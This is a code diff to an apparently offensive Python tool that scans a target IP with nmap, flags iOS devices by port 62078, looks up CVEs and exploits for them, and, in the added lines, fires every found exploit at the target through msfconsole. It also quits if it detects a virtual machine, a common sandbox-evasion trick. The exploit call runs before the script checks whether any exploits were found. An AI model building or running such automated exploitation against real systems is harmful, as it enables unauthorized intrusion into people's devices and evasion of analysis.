@@ -3,6 +3,14 @@ from get_cve import *
 from vm_detection import *
 from executing import *
 
+def execute_msf_exploit(exploit, target_ip):
+    msf_command = f"msfconsole -q -x 'use {exploit}; set RHOST {target_ip}; run'"
+    try:
+        subprocess.run(msf_command, shell=True, check=True)
+        print(f"Exploit {exploit} executed successfully on {target_ip}")
+    except subprocess.CalledProcessError as e:
+        print(f"Error executing exploit: {e}")
+
 
 if __name__ == "__main__":
     target_ip = input("Enter target IP: ")
@@ -11,12 +19,16 @@ if __name__ == "__main__":
         print("The system is running in a virtual machine.")
         exit(1)
     
-    nmap_output = subprocess.run(["nmap", "-O", target_ip], capture_output=True, text=True)
+    nmap_output = subprocess.run(["nmap", "-O", "-p62078", target_ip], capture_output=True, text=True)
+    
     os_info = "Unknown"
+
     for line in nmap_output.stdout.split("\n"):
         if "OS details:" in line:
             os_info = line.split(":", 1)[1].strip()
-            break
+        if "62078/tcp" in line:
+            os_info = "IOS"
+
     print(f"Detected OS: {os_info}")
     
     cve_list = get_cve()
@@ -25,6 +37,7 @@ if __name__ == "__main__":
             cve = cve_info["cve"]
             print(f"Searching for exploits for {cve}...")
             results = search_exploits(cve)
+            execute_msf_exploit(results, target_ip)
             
             if results: 
                 print(f"Found exploits for {cve}:")
